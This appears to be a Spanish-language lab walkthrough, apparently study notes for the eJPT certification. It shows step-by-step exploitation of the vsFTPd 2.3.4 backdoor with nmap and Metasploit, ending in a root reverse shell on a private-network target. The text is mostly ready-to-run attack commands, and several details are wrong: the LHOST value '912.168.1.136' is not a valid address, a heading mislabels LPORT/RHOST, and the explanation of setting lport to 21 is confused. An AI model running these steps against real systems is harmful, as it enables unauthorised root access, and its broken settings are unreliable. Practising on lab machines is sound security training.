1. Encontrar la CVE (Vulnerabilidad publica) del puerto 21 (ftp):
```
sudo nmap --script "vuln" -p21 192.168.1.135		
```
![Metasploit 3](ejpt/img/metasploit-3.png)
***PROBAR SIEMPRE LOGEARSE CON EL USUARIO "anonymous" EN EL PROTOCOLLO FTP, PUEDE SER UE ESTE MAL CONFIGURADO Y GANES ACCESO FTP A LA VICTIMA, COMANDO DE NMAP PARA DETECTAR LA VULNERABILIDAD "anonymous login" (de normal ya viene integrado en NMAP):***
```
sudo nmap -p21 --script "ftp-anon" 192.168.1.135
```

2. Abrir Metasploit:
	```
	msfconsole
	```

3. Buscar Exploits para esta vulnerabilidad (la CVE no funciona en este caso):
	```
	search vsFTPd 2.3.4
	```
	![Metasploit 4](ejpt/img/metasploit-4.png)
	
4. Seleccionar el Exploit que queremos utlizar:
```
use 0
```

5. 5. Completar el Exploit
	1. Ver el Exploit y el Payload:
	```
	show options
	```
	
	2. Establecer el LPORT (El puerto de FTP, 21 por lo general) y RHOST (IP victima):
	```
	set lhost 912.168.1.136
	```
	
	```
	set lport 21
	```
	*Esto **NO** significa que vayamos a establecer la conexión usando el puerto 21, esto quiere decir que utilizaremos el puerto 21 (puerto del servicio FTP) para entrar a la maquina. Para establecer la conexión usaremos un puerto aleatorio en la victima y en el atacante. **Ej. Recibimos la Reverse Shell por el puerto  41269 (Puerto aleatorio) y la victima nos ha enviado la Reverse Shell por el puerto 6200 (Otro puerto aleatorio)**.*
	```
	set rhost 192.168.1.135
	```
	
	3. Comprobar que el Exploit se ha completado correctamente:
	```
	show options
	```

6. Ejecutar el Exploit (run o exploit):	
```
run
```
	
```
exploit
```

7. Ya habrás recibido la Reverse Shell de la victima como ***ROOT***.
8. Para tener un *prompt* para ver mejor (Opcional):
	```
	shell
	```